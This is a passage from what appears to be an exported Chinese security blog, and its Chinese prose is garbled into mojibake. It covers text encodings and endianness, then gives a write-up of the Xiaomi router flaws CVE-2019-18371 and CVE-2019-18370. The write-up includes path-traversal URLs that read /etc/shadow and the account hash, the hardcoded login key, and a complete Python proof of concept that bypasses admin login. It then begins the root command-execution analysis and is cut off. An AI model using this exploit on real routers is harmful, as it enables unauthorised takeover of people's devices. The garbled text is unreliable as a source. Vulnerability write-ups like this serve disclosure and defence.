çš„æ‰©å±•è¡¨å­—ç¬¦ä¸å¸¸ç”¨ï¼Œé‚£å°±é’ˆå¯¹æ‰©å±•çš„ASCIIç ï¼ŒæŠŠä¸¤ä¸ªæ‰©å±•çš„ASCIIç å­—èŠ‚æ‹¼åœ¨ä¸€èµ·ï¼Œå˜æˆä¸€ä¸ªæ–°çš„æ±‰å­—ã€‚æ¯”å¦‚C4 E3å°±æ˜¯ä½ ï¼ŒBA C3å°±æ˜¯å¥½ ä½†æ˜¯è¿™ç§ç¼–ç æ–¹å¼æœ‰ä¸ªå¾ˆä¸¥é‡çš„é—®é¢˜ï¼Œæ¯ä¸ªå›½å®¶éƒ½æœ‰æ¯ä¸ªå›½å®¶çš„ç¼–ç ï¼Œæ¯”å¦‚å‘é€ä¸€ç¯‡ç¼–ç æ–¹å¼ä¸ºGB2312ï¼Œå†…å®¹ä¸ºä½ å¥½ï¼Œçš„é‚®ä»¶ç»™æ–°åŠ å¡ï¼Œè€Œæ–°åŠ å¡ç”¨çš„æ˜¯big5ç¼–ç ï¼Œä¹Ÿæ˜¯ç”¨ä¸¤ä¸ªæ‹“å±•ASCIIçš„å­—èŠ‚æ‹¼æˆä¸€ä¸ªæ–°çš„å­—ï¼Œä½†å®ƒç”¨big5æ‹¼å‡ºæ¥è‚¯å®šä¸æ˜¯ä½ å¥½äºŒå­—ï¼Œæ˜¯ä¹±ç ï¼ ä¸‰ã€Unicodeç¼–ç 1ã€ä»€ä¹ˆæ˜¯Unicodeï¼Ÿè¿™æ˜¯ä¸€ä¸ªç¼–ç æ–¹æ¡ˆï¼Œè¯´ç™½äº†å°±æ˜¯ä¸€å¼ åŒ…å«å…¨ä¸–ç•Œæ‰€æœ‰æ–‡å­—çš„ä¸€å¼ ç¼–ç è¡¨ï¼Œåªè¦æ˜¯è¿™ä¸ªä¸–ç•Œä¸Šå­˜åœ¨çš„æ–‡å­—ç¬¦å·ï¼Œç»Ÿç»Ÿç»™ä½ ä¸€ä¸ªå”¯ä¸€çš„ç¼–ç ã€‚ Unicodeç¼–ç èŒƒå›´æ˜¯ï¼š0x000000â€”â€”0x10FFFFï¼Œå¯ä»¥å®¹çº³100å¤šä¸‡ä¸ªç¬¦å·ï¼ 2ã€Unicodeçš„é—®é¢˜Unicodeåªæ˜¯ä¸€ä¸ªç¬¦å·é›†ï¼Œå®ƒåªè§„å®šäº†ç¬¦å·çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå´æ²¡æœ‰è§„å®šè¿™ä¸ªäºŒè¿›åˆ¶ä»£ç åº”è¯¥å¦‚ä½•å­˜å‚¨ å‡è®¾ä¸­æ˜¯ï¼š1234ï¼Œé‚£ä¹ˆå°±æ˜¯12 34è¿™æ ·å­˜å‚¨ï¼Œå ä¸¤ä¸ªå­—èŠ‚ï¼›å›½æ˜¯12345ï¼Œé‚£åˆ°åº•è¯¥æ€ä¹ˆå­˜å‚¨ï¼Œ01 23 45è¿˜æ˜¯12 34 50åˆæˆ–è€…æ˜¯å…¶ä»–æ–¹å¼å‘¢ï¼Ÿä¸å¾—è€ŒçŸ¥ 3ã€å¦‚ä½•å­˜å‚¨Unicodeï¼šUTF-16/UTF-8UTF-16/UTF-8æ˜¯Unicodeçš„å®ç°æ–¹å¼ ï¼ˆ1ï¼‰UTF-16ï¼ˆUnicodeçš„é»˜è®¤å­˜å‚¨æ–¹å¼ï¼‰UTF-16ç¼–ç ä»¥16ä½æ— ç¬¦å·æ•´æ•°ä¸ºå•ä½ï¼Œæ³¨æ„æ˜¯16ä½ä¸ºä¸€ä¸ªå•ä½ï¼Œä¸è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦å°±åªæœ‰16ä½ã€‚è¿™ä¸ªè¦çœ‹å­—ç¬¦çš„Unicodeç¼–ç å¤„äºä»€ä¹ˆèŒƒå›´è€Œå®šï¼Œæœ‰å¯èƒ½æ˜¯2ä¸ªå­—èŠ‚ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯4ä¸ªå­—èŠ‚ã€‚ æ²¡æœ‰æ»¡ä¸¤ä¸ªå­—èŠ‚çš„å°±è¡¥å…¨åˆ°ä¸¤ä¸ªå­—èŠ‚ï¼Œæ»¡ä¸¤ä¸ªå­—èŠ‚çš„å°±è¡¥å…¨åˆ°å››ä¸ªå­—èŠ‚ï¼Œä»¥æ­¤ç±»æ¨ã€‚ ç°åœ¨æœºå™¨ä¸Šçš„Unicodeç¼–ç ä¸€èˆ¬æŒ‡çš„å°±æ˜¯UTF-16ã€‚ åšä¸ªå°å®éªŒï¼Œæ–‡æœ¬æ–‡ä»¶Unicode.txtçš„å†…å®¹ä¸ºAä¸­ä¸”ç”¨Unicodeç¼–ç ï¼Œç”¨UEæ‰“å¼€è¯¥æ–‡ä»¶ï¼ŒæŸ¥çœ‹åå…­è¿›åˆ¶ã€‚è®¡ç®—æœºä¸­é»˜è®¤æ˜¯å°ç«¯å­˜å‚¨ï¼Œé¦–å…ˆå‰ä¸¤2ä¸ªå­—èŠ‚0xFEFFå…ˆåˆ«ç®¡ï¼ˆåç»­ä¼šè¯´ï¼‰ï¼Œ0x0041æ˜¯Aï¼Œ0x4E2Dæ˜¯ä¸­ï¼Œæ²¡é—®é¢˜ ä½†è¿™æ ·å°±ä¼šæœ‰ä¸ªé—®é¢˜ï¼ŒAç”¨0x41ä¸€ä¸ªå­—èŠ‚å°±å¯ä»¥å­˜å‚¨ï¼Œç”¨ä¸¤ä¸ªå­—èŠ‚å­˜å‚¨0x0041é€ æˆäº†èµ„æºæµªè´¹ï¼Œè¿™åœ¨æœ¬åœ°å­˜å‚¨è¿˜æ²¡ä»€ä¹ˆï¼Œé¡¶å¤šè´¹ç‚¹ç¡¬ç›˜ï¼›ä¸»è¦æ˜¯åœ¨ç½‘ç»œä¼ è¾“ä¸­ï¼Œæœ¬æ¥4kèƒ½ä¼ å®Œçš„ä¸œè¥¿è¦ä¼ 8kï¼Œæµªè´¹äº†å¸¦å®½ï¼Œäºæ˜¯ä¾¿è¯ç”Ÿäº†UTF-8æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€ŒUTF-8ä¹Ÿæ­£æ˜¯åœ¨ç½‘ç»œä¼ è¾“é—®é¢˜ä¸Šç«èµ·æ¥äº† UTF-32å³æ˜¯ä»¥å››ä¸ªå­—èŠ‚ä¸ºå•ä½ï¼Œæ›´æš´åŠ›äº† ï¼ˆ2ï¼‰UTF-8UTF-8æ˜¯ä¸€ç§å˜é•¿çš„å­˜å‚¨æ–¹æ¡ˆï¼Œé¡¾åæ€ä¹‰ï¼Œ1ä¸ªå­—èŠ‚èƒ½å­˜å‚¨çš„å°±ç”¨1ä¸ªå­—èŠ‚ï¼Œ2ä¸ªå­—èŠ‚èƒ½å­˜å‚¨çš„å°±ç”¨2ä¸ªå­—èŠ‚â€¦â€¦.ï¼Œä¼˜ç‚¹å°±æ˜¯èŠ‚çœç©ºé—´ï¼Œç¼ºç‚¹å°±æ˜¯è§£æå›°éš¾ UTF-8çš„ç¼–ç è§„åˆ™å¾ˆç®€å•ï¼Œåªæœ‰äºŒæ¡ï¼š 1ï¼‰å¯¹äºå•å­—èŠ‚çš„ç¬¦å·ï¼Œå­—èŠ‚çš„ç¬¬ä¸€ä½è®¾ä¸º0ï¼Œåé¢7ä½ä¸ºè¿™ä¸ªç¬¦å·çš„unicodeç ã€‚å› æ­¤å¯¹äºè‹±è¯­å­—æ¯ï¼ŒUTF-8ç¼–ç å’ŒASCIIç æ˜¯ç›¸åŒçš„ã€‚ 2ï¼‰å¯¹äºnå­—èŠ‚çš„ç¬¦å·ï¼ˆn&gt;1ï¼‰ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰nä½éƒ½è®¾ä¸º1ï¼Œç¬¬n+1ä½è®¾ä¸º0ï¼Œåé¢å­—èŠ‚çš„å‰ä¸¤ä½ä¸€å¾‹è®¾ä¸º10ã€‚å‰©ä¸‹çš„æ²¡æœ‰æåŠçš„äºŒè¿›åˆ¶ä½ï¼Œå…¨éƒ¨ä¸ºè¿™ä¸ªç¬¦å·çš„unicodeç ã€‚ åˆ†ç±» Unicodeç¼–ç ï¼ˆ16è¿›åˆ¶ï¼‰ UTF-8å­—èŠ‚æµï¼ˆäºŒè¿›åˆ¶ï¼‰ ç‰¹ç‚¹ 1 0000 0000 - 0000 007F 0xxxxxx æ˜¯å’‹æ ·å°±å’‹æ · 2 0000 0080 - 0000 07FF 110xxxxx 10xxxxxx ä¸€åˆ†ä¸ºäºŒ 3 0000 0800 - 0000 FFFF 1110xxxx 10xxxxxx 10xxxxxx ä¸€åˆ†ä¸ºä¸‰ 4 0001 0000 - 0010 FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx ä¸€åˆ†ä¸ºå›› ä¸¾ä¸ªä¾‹å­ï¼Œç”±ä¸Šé¢çš„å®éªŒå¯çŸ¥ä»¥ä¸‹ä¿¡æ¯ Aä¸­--&gt;Unicodeç¼–ç ï¼š0x0041 0x4E2D ç°åœ¨å°†Aä¸­è¿›è¡ŒUTF-8ç¼–ç ï¼Œç»“æœå¦‚ä¸‹å›¾ï¼šå‰é¢çš„ä¸‰ä¸ªå­—èŠ‚0xBFBBEFå…ˆä¸ç”¨ç®¡ï¼Œåé¢æ˜¯41 E4 B8 AD ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿçœ‹ä¸‹é¢çš„åˆ†æ é¦–å…ˆæ˜¯å·²çŸ¥ä¿¡æ¯Aä¸­--&gt;UTF-16ç¼–ç ï¼š0x0041 0x4E2DAä¸­--&gt;UTF-8ç¼–ç ï¼š 0x41 0xE4B8ADï¼ˆUTF-8ä»¥å¤§ç«¯å­˜å‚¨ï¼‰æˆ‘ä»¬ä»å·²çŸ¥ä¿¡æ¯æ¥åˆ†æä¸ºä»€ä¹ˆä¼šäº§ç”Ÿè¿™æ ·çš„ç»“æœ[+] Açš„UTF-16ç¼–ç çš„ç»“æœä¸º0x0041ï¼Œåœ¨ä¸Šè¡¨ä¸­ç¬¬ä¸€ç§æƒ…å†µçš„åŒºé—´å†…ï¼Œå› æ­¤æ˜¯å’‹æ ·å°±å’‹æ ·ï¼ŒUTF16çš„Aè½¬æ¢ä¸ºUTF-8çš„Aä¿æŒä¸å˜[+] ä¸­çš„UTF-16ç¼–ç çš„ç»“æœä¸º0x4E2Dï¼Œåœ¨ä¸Šè¡¨ä¸­ç¬¬ä¸‰ç§æƒ…å†µçš„åŒºé—´å†…ï¼Œå› æ­¤æŒ‰ç…§ä»¥ä¸‹è§„åˆ™ä¸€åˆ†ä¸ºä¸‰ï¼š [---] 0x4E2Dçš„äºŒè¿›åˆ¶æ˜¯0100 1110 0010 1101ï¼Œå°†å¾—åˆ°çš„äºŒè¿›åˆ¶æ•°æ®ä¾æ¬¡å¡«å……åˆ°1110xxxx 10xxxxxx 10xxxxxxä¸­å°±æ˜¯1110(0100) 10(111000) 10(101101)ï¼Œå³E4 B8 ADï¼Œå³0xE4B8AD [---] åŒæ ·çš„ï¼Œåå‘åˆ†æçš„è¯ï¼Œ0xE4B8ADäºŒè¿›åˆ¶ä¸º1110(0100) 10(111000) 10(101101)ï¼Œä»¥å››ä½å³åå…­è¿›åˆ¶æå–å‡ºæ¥å³0100 1110 0010 1101ï¼Œå³4E 2Dï¼Œå³0x4E2D å› æ­¤å¯ä»¥å¾—å‡ºä¸€ä¸ªä¸€èˆ¬æ€§çš„ç»“è®ºï¼šå½“ç½‘ç»œä¼ è¾“æ–‡ä»¶çš„æ—¶å€™ï¼Œæ•°å­—å­—æ¯ç¬¦å·æ¯”è¾ƒå¤šï¼Œå°±ç”¨UTF-8æ›´èŠ‚çœèµ„æºï¼Œå¦‚æœæ±‰å­—æ¯”è¾ƒå¤šï¼Œç”¨UTF-8èŠ‚çœä¸äº†å¤šå°‘èµ„æºï¼Œä½¿ç”¨UTF-16å³å¯ ï¼ˆ3ï¼‰BOMï¼ˆByte Order Markï¼‰å¦‚æœæ¥æ”¶åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“æ˜¯ç”¨UTF-8è¿˜æ˜¯ç”¨UTF-16è§£æå‘¢ï¼Ÿè¿™å°±æœ‰äº†å­—èŠ‚åºæ ‡è®°æ¥è§£å†³è¿™ä¸ªé—®é¢˜ ç¼–ç  æ•°æ®æµ å¤§å°ç«¯ UTF-8 EF BB BF å¤§ç«¯å­˜å‚¨ UTF-16 LEï¼ˆlittle endianï¼‰ FF FE å°ç«¯å­˜å‚¨ UTF-16 BEï¼ˆbig endianï¼‰ FE FF å¤§ç«¯å­˜å‚¨ ä¸ºä»€ä¹ˆUTF-16éœ€è¦åŒºåˆ†å¤§ç«¯å°ç«¯ï¼Œè€ŒUTF-8ä¸ç”¨å‘¢ï¼Ÿ å¯¹UTF-16æ¥è¯´ï¼Œå› ä¸ºæ˜¯ä»¥ä¸¤ä¸ªå­—èŠ‚ä¸ºå•ä½ï¼Œä¸¤ä¸ªå­—èŠ‚æ­£ç€æ”¾ï¼Œå’Œåç€æ”¾ï¼Œä¼šå¯¹åº”ä¸¤ä¸ªä¸åŒå­—ä¸Šé¢å»ã€‚ å¯¹UTF-8æ¥è¯´ï¼Œç”±äºUTF-8çš„è®¾è®¡ï¼Œä¸€ä¸ªå­—ç¬¦å¯¹åº”çš„å„ä¸ªå­—èŠ‚ï¼Œæ˜¯èƒ½å¤ŸåŒºåˆ†å‡ºå“ªä¸ªæ˜¯æ•°æ®é«˜ä½ã€å“ªä¸ªæ•°æ®ä½ä½çš„ï¼Œæ‰€ä»¥ä¸éœ€è¦ã€‚ä¸Šè¡¨ä¸­ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚å°±å±äºæ˜¯æ•°æ®é«˜ä½ã€‚ ä¸ç®¡æ˜¯å†…å­˜ã€è¿˜æ˜¯æ–‡ä»¶ï¼Œç¨‹åºæ€»æ˜¯ä»ä½åœ°å€è¯»åˆ°é«˜åœ°å€ï¼Œè€Œç”±äºç¬¬ä¸€ä¸ªå­—èŠ‚çš„å¼€å¤´å¯ä»¥æŒ‡ç¤ºå‡ºè¿™ä¸ªå­—ç¬¦è¿˜å‰©ä½™å‡ ä¸ªå­—èŠ‚éœ€è¦è¯»å–ï¼Œæ‰€ä»¥UTF-8å¿…é¡»æŠŠå¯ä»¥æŒ‡ç¤ºå‰©ä½™å­—èŠ‚æ•°çš„é‚£ä¸ªå­—èŠ‚æ”¾åˆ°ä½åœ°å€ï¼Œå…¶ä½™å­—èŠ‚ä¾æ¬¡æ”¾åˆ°é«˜åœ°å€ã€‚ å››ã€å¤§å°ç«¯å­˜å‚¨æ–¹å¼è®¡ç®—æœºé»˜è®¤æ˜¯å°ç«¯å­˜å‚¨ å°ç«¯å­˜å‚¨ï¼šæ˜¯æŒ‡æ•°æ®çš„é«˜å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„é«˜åœ°å€ä¸­ï¼Œè€Œæ•°æ®çš„ä½å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„ä½åœ°å€ä¸­ï¼Œè¿™ç§å­˜å‚¨æ¨¡å¼å°†åœ°å€çš„é«˜ä½å’Œæ•°æ®ä½æƒæœ‰æ•ˆåœ°ç»“åˆèµ·æ¥ï¼Œé«˜åœ°å€éƒ¨åˆ†æƒå€¼é«˜ï¼Œä½åœ°å€éƒ¨åˆ†æƒå€¼ä½ï¼Œå’Œæˆ‘ä»¬çš„é€»è¾‘æ–¹æ³•ä¸€è‡´ã€‚ å¤§ç«¯å­˜å‚¨ï¼šæ˜¯æŒ‡æ•°æ®çš„é«˜å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„ä½åœ°å€ä¸­ï¼Œè€Œæ•°æ®çš„ä½å­—èŠ‚ä¿å­˜åœ¨å†…å­˜çš„é«˜åœ°å€ä¸­ï¼Œè¿™æ ·çš„å­˜å‚¨æ¨¡å¼æœ‰ç‚¹å„¿ç±»ä¼¼äºæŠŠæ•°æ®å½“ä½œå­—ç¬¦ä¸²é¡ºåºå¤„ç†ï¼šåœ°å€ç”±å°å‘å¤§å¢åŠ ï¼Œè€Œæ•°æ®ä»é«˜ä½å¾€ä½ä½æ”¾ã€‚ï¼ˆå¤§ç«¯æ¨¡å¼æ˜¯æˆ‘ä»¬ç›´è§‚ä¸Šçš„è®¤ä¸ºçš„æ¨¡å¼ï¼‰ å¦‚æœå°†ä¸€ä¸ª32ä½çš„æ•´æ•°0x12345678å­˜æ”¾åˆ°ä¸€ä¸ªæ•´å‹å˜é‡ï¼ˆintï¼‰ä¸­ï¼Œè¿™ä¸ªæ•´å‹å˜é‡é‡‡ç”¨å¤§ç«¯æˆ–è€…å°ç«¯æ¨¡å¼åœ¨å†…å­˜ä¸­çš„å­˜å‚¨ç”±ä¸‹è¡¨æ‰€ç¤ºã€‚ ä¸ºç®€å•èµ·è§ï¼Œæœ¬æ–‡ä½¿ç”¨OP0è¡¨ç¤ºä¸€ä¸ª32ä½æ•°æ®çš„æœ€é«˜å­—èŠ‚MSBï¼ˆMost Significant Byteï¼‰ï¼Œä½¿ç”¨OP3è¡¨ç¤ºä¸€ä¸ª32ä½æ•°æ®æœ€ä½å­—èŠ‚LSBï¼ˆLeast Significant Byteï¼‰ã€‚ å°ç«¯ï¼šè¾ƒé«˜çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒé«˜çš„å­˜å‚¨å™¨åœ°å€ï¼Œè¾ƒä½çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒä½çš„å­˜å‚¨å™¨åœ°å€ã€‚å¤§ç«¯ï¼šè¾ƒé«˜çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒä½çš„å­˜å‚¨å™¨åœ°å€ï¼Œè¾ƒä½çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒé«˜çš„å­˜å‚¨å™¨åœ°å€ã€‚ æµ‹è¯•ä»£ç  #include &lt;stdio.h&gt;void main() &#123; int i = 0x12345678; char* pc = (char*)&amp;i; if (*pc == 0x12) &#123; printf(&quot;Big Endian\\n&quot;); &#125; else if (*pc == 0x78) &#123; printf(&quot;Little Endian\\n&quot;); &#125; &#125;","categories":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://wolke.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://wolke.cn/tags/%E9%80%86%E5%90%91/"}],"author":"w01ke"},{"title":"å°ç±³è·¯ç”±å™¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2019-18370ï¼ŒCVE-2019-18371)","slug":"å°ç±³è·¯ç”±å™¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2019-18370ï¼ŒCVE-2019-18371","date":"2022-03-14T09:02:54.000Z","updated":"2022-03-14T09:10:59.295Z","comments":true,"path":"post/83737637.html","link":"","permalink":"https://wolke.cn/post/83737637.html","excerpt":"","text":"ä¸€ã€è¿œç¨‹ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2019-18371ï¼‰1ã€æ¼æ´äº§ç”ŸåŸç†å°ç±³è·¯ç”±å™¨çš„nginxé…ç½®æ–‡ä»¶é”™è¯¯ï¼Œå¯¼è‡´ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆæ— éœ€ç™»å½•ï¼‰ nginxé…ç½®ä¸å½“å¯å¯¼è‡´ç›®å½•ç©¿è¶Šæ¼æ´ location /xxx &#123; alias /abc/;&#125; å¯é€šè¿‡è®¿é—®http://domain.cn/xxx../etc/passwdå®ç°ç›®å½•ç©¿è¶Šè®¿é—®ä¸Šçº§ç›®å½•åŠå…¶å­ç›®å½•æ–‡ä»¶ã€‚ åœ¨å°ç±³è·¯ç”±å™¨çš„æ–‡ä»¶/etc/sysapihttpd/sysapihttpd.confä¸­ï¼Œå­˜åœ¨ location /api-third-party/download/extdisks &#123; alias /extdisks/;&#125; æ•…å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œè€Œä¸”æ˜¯rootæƒé™ï¼Œå¦‚è®¿é—®http://192.168.31.1/api-third-party/download/extdisks../etc/shadow ç±»ä¼¼çš„é—®é¢˜ï¼Œå­˜åœ¨å¤šå¤„å¦‚ location /backup/log &#123; alias /tmp/syslogbackup/;&#125;location /api-third-party/download/public &#123; alias /userdisk/data/;&#125;location /api-third-party/download/private &#123; alias /userdisk/appdata/;&#125; 2ã€æ¼æ´åˆ©ç”¨é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç™»å½•è·¯ç”±å™¨åå° ä¸æ˜¯æ˜æ–‡å­˜å‚¨å¯†ç ï¼Œè¿›è¡Œä¸€å®šåˆ†æã€‚å…³æ³¨ä¸¤ä¸ªè¿‡ç¨‹ï¼Œä¸€æ˜¯ç™»å½•æ—¶å‰ç«¯jsç”Ÿæˆhttp postè¯·æ±‚å‚æ•°è¿‡ç¨‹ï¼ŒäºŒæ˜¯éªŒè¯ç”¨æˆ·ç™»é™†çš„åç«¯è¿‡ç¨‹ã€‚ ï¼ˆ1ï¼‰ç™»å½•æ—¶å‰ç«¯jsç”ŸæˆHTTP POSTè¯·æ±‚å‚æ•°è¿‡ç¨‹ var Encrypt = &#123; key: &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;, iv: &#x27;64175472480004614961023454661220&#x27;, nonce: null, init: function()&#123; var nonce = this.nonceCreat(); this.nonce = nonce; return this.nonce; &#125;, nonceCreat: function()&#123; var type = 0; // è‡ªå·±çš„macåœ°å€ var deviceId = &#x27;&lt;%=mac%&gt;&#x27;; var time = Math.floor(new Date().getTime() / 1000); var random = Math.floor(Math.random() * 10000); return [type, deviceId, time, random].join(&#x27;_&#x27;); &#125;, oldPwd : function(pwd)&#123; // oldPwd = sha1(nonce + sha1(pwd + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;)) return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString(); &#125;, //...&#125;; å¯çŸ¥oldPwd = sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))ï¼Œç™»é™†è¯·æ±‚åŒ…ä¸º POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1Host: 192.168.31.1username=admin&amp;password=c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab&amp;logtype=2&amp;nonce=0_macåœ°å€_æ—¶é—´æˆ³_5248 ï¼ˆ2ï¼‰éªŒè¯ç”¨æˆ·ç™»å½•çš„åç«¯è¿‡ç¨‹è°ƒç”¨XQSecureUtil.checkUserå‡½æ•° function checkUser(user, nonce, encStr) -- ä»xiaoqiang é…ç½®æ–‡ä»¶ä¸­è¯»å–ä¿¡æ¯ local password = XQPreference.get(user, nil, &quot;account&quot;) if password and not XQFunction.isStrNil(encStr) and not XQFunction.isStrNil(nonce) then if XQCryptoUtil.sha1(nonce..password) == encStr then return true end end XQLog.log(4, (luci.http.getenv(&quot;REMOTE_ADDR&quot;) or &quot;&quot;)..&quot; Authentication failed&quot;, nonce, password, encStr) return falseend è·Ÿè¿›XQPreference.getå‡½æ•°æ˜“çŸ¥é“æ˜¯ä»/etc/config/accountæ–‡ä»¶ä¸­è¯»å–æŸä¸ªå­—ç¬¦ä¸²ï¼Œè¿™é‡Œç§°å®ƒä¸ºaccountStrã€‚ checkUserå‡½æ•°åˆ¤æ–­ç­‰å¼ä¸º(encSträ¸ºå‚æ•°oldPwd) sha1(nonce + sha1(å¯†ç  + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;))==sha1(nonce + accountStr) åˆ™ accountStr == sha1(å¯†ç  + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;) æ•…ï¼Œåªéœ€è¦è¯»å–/etc/config/accountå¾—åˆ°accountStrå³å¯æ„é€ å¦‚ä¸‹æ•°æ®åŒ…ç™»é™† POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1Host: 192.168.31.1username=admin&amp;password=sha1(nonce + accountä¸­ä¿å­˜çš„å­—ç¬¦ä¸²)&amp;logtype=2&amp;nonce=0_macåœ°å€_æ—¶é—´æˆ³_5248 3ã€å®ç°ä»»æ„ç™»å½•POCarbitrary_file_read_vulnerability.py import osimport reimport timeimport base64import randomimport hashlibimport requestsfrom Crypto.Cipher import AES# proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;proxies = &#123;&#125;def get_mac(): ## get mac r0 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/web&quot;, proxies=proxies) mac = re.findall(r&#x27;deviceId = \\&#x27;(.*?)\\&#x27;&#x27;, r0.text)[0] # print(mac) return macdef get_account_str(): ## read /etc/config/account r1 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;, proxies=proxies) print(r1.text) account_str = re.findall(r&#x27;admin\\&#x27;? \\&#x27;(.*)\\&#x27;&#x27;, r1.text)[0] return account_strdef create_nonce(mac): type_ = 0 deviceId = mac time_ = int(time.time()) rand = random.randint(0,10000) return &quot;%d_%s_%d_%d&quot;%(type_, deviceId, time_, rand)def calc_password(nonce, account_str): m = hashlib.sha1() m.update((nonce + account_str).encode(&#x27;utf-8&#x27;)) return m.hexdigest()mac = get_mac()account_str = get_account_str()## login, get stoknonce = create_nonce(mac)password = calc_password(nonce, account_str)data = &quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;.format(password=password,nonce=nonce)r2 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;, data = data, headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;&#125;, proxies=proxies)# print(r2.text)stok = re.findall(r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;,r2.text)[0]print(&quot;stok=&quot;+stok) å¯ä»¥è·å–åˆ°ç™»å½•çš„stokã€‚ äºŒã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆrootæƒé™ï¼‰ï¼ˆCVE-2019-18370ï¼‰ åœ¨å®¡è®¡luaä»£ç è¿‡ç¨‹ä¸­ï¼Œå‘ç°å¤‡ä»½æ–‡ä»¶æ˜¯tar.gzæ ¼å¼çš„ï¼Œä¸Šä¼ åtar -zxfè§£å‹ï¼Œæ‰€ä»¥æ„é€ å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥æ§åˆ¶è§£å‹ç›®å½•çš„æ–‡ä»¶å†…å®¹ï¼Œç»“åˆæµ‹è¯•ä¸Šä¼ ä¸‹è½½é€Ÿåº¦åŠŸèƒ½çš„shè„šæœ¬æ‰§è¡Œæ—¶è¯»å–æµ‹è¯•urlåˆ—è¡¨æ–‡ä»¶ï¼Œå¹¶å°†urléƒ¨åˆ†ç›´æ¥è¿›è¡Œå‘½ä»¤æ‹¼æ¥æ‰§è¡Œã€‚ å¤‡ä»½æ–‡ä»¶è§£å‹å¯¼è‡´/tmp/ç›®å½•ä»»æ„æ–‡ä»¶å¯æ§ åœ¨/usr/lib/lua/luci/controller/api/misystem.luaä¸­ï¼Œé…ç½®æ–‡ä»¶åŠŸèƒ½å¦‚ä¸‹ function cUpload() local LuciFs = require(&quot;luci.fs&quot;) local XQBackup = require(&quot;xiaoqiang.module.XQBackup&quot;) local code = 0 local canupload = true local uploadFilepath = &quot;/tmp/cfgbackup.tar.gz&quot; local fileSize = tonumber(LuciHttp.getenv(&quot;CONTENT_LENGTH&quot;)) if fileSize &gt; 102400 then canupload = false end LuciHttp.setfilehandler( function(meta, chunk, eof) if canupload then if not fp then if meta and meta.name == &quot;image&quot; then fp = io.open(uploadFilepath, &quot;w&quot;) end end if chunk then fp:write(chunk) end if eof then fp:close() end else code = 1630 end end ) if LuciHttp.formvalue(&quot;image&quot;) and fp then code = 0 end local result = &#123;&#125; if code == 0 then local ext = XQBackup.extract(uploadFilepath) if ext == 0 then result[&quot;des&quot;] = XQBackup.getdes() else code = 1629 end end if code ~= 0 then result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code) LuciFs.unlink(uploadFilepath) end result[&quot;code&quot;] = code LuciHttp.write_json(result)end å…¶ä¸­è°ƒç”¨XQBackup.extract(uploadFilepath)è¿›è¡Œè§£å‹ -- 0:succeed-- 1:file does not exist-- 2:no description file-- 3:no mbu filefunction extract(filepath) local fs = require(&quot;nixio.fs&quot;) local tarpath = filepath if not tarpath then tarpath = TARMBUFILE end if not fs.access(tarpath) then return 1 end os.execute(&quot;cd /tmp; tar -xzf &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;) os.execute(&quot;rm &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;) if not fs.access(DESFILE) then return 2 end if not fs.access(MBUFILE) then return 3 end return 0end å¯çŸ¥ï¼Œ/tmpç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶å¯æ§ 